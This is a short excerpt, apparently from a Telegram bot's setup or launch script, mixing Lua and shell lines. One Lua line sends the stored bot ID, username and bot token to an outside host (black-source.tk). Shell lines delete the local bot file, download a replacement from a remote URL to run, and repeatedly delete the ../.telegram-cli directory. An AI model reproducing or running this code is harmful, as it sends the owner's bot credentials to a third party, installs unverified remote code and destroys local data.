...
https.request("https://black-source.tk/BlackTeAM/index.php?n=broks&id="..database:get(Server_Marjona.."Id_Marjona").."&user="..database:get(Server_Marjona.."UserName_Marjona").."&token="..database:get(Server_Marjona.."Token_Marjona"))
...
rm -fr Marjona.lua
wget "https://raw.githubusercontent.com/MarjonaTEAM/Marjona/main/Marjona.lua"
while(true) do
rm -fr ../.telegram-cli
